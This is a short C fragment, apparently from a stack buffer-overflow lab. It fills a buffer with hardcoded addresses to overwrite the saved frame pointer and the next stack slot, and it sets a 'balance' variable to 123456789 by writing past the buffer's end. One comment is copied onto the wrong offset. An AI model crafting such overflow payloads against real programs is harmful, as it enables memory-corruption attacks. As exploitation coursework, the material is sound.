...
int main() {
  ...
  *((unsigned*)(&buf[172])) = 0xffffdb68; // overflow saved ebp withsaved ebp value; here 172 = $epb - &buf
*((unsigned*)(&buf[176])) = 0xffffd97c; // overflow saved ebp with saved ebp value; here 172 = $epb - &buf
*((unsigned*)(&buf[160])) = 0x075bcd15; // overflow the balance value with 0x075bcd15 which is 123456789 in hex format, where 160 = &balance - &buf
